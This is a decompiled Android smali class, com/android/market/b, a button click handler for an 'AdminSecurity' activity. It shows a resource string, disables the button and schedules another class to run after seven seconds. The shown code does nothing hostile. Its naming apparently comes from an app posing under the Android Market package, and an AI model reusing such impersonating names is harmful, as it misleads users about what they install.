.class Lcom/android/market/b;
.super Ljava/lang/Object;

# interfaces
.implements Landroid/view/View$OnClickListener;


# instance fields
.field final synthetic a:Lcom/android/market/AdminSecurity;

.field private final synthetic b:Landroid/widget/TextView;

.field private final synthetic c:Landroid/widget/Button;


# direct methods
.method constructor <init>(Lcom/android/market/AdminSecurity;Landroid/widget/TextView;Landroid/widget/Button;)V
    .locals 0

    iput-object p1, p0, Lcom/android/market/b;->a:Lcom/android/market/AdminSecurity;

    iput-object p2, p0, Lcom/android/market/b;->b:Landroid/widget/TextView;

    iput-object p3, p0, Lcom/android/market/b;->c:Landroid/widget/Button;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method static synthetic a(Lcom/android/market/b;)Lcom/android/market/AdminSecurity;
    .locals 1

    iget-object v0, p0, Lcom/android/market/b;->a:Lcom/android/market/AdminSecurity;

    return-object v0
.end method

.method private a()V
    .locals 4

    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    new-instance v1, Lcom/android/market/c;

    invoke-direct {v1, p0}, Lcom/android/market/c;-><init>(Lcom/android/market/b;)V

    const-wide/16 v2, 0x1b58

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method


# virtual methods
.method public onClick(Landroid/view/View;)V
    .locals 4

    iget-object v0, p0, Lcom/android/market/b;->b:Landroid/widget/TextView;

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "\n\n\n\n\n"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v2, p0, Lcom/android/market/b;->a:Lcom/android/market/AdminSecurity;

    const v3, 0x7f050005

    invoke-virtual {v2, v3}, Lcom/android/market/AdminSecurity;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "\n\n\n\n\n"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    iget-object v0, p0, Lcom/android/market/b;->c:Landroid/widget/Button;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setEnabled(Z)V

    invoke-direct {p0}, Lcom/android/market/b;->a()V

    return-void
.end method
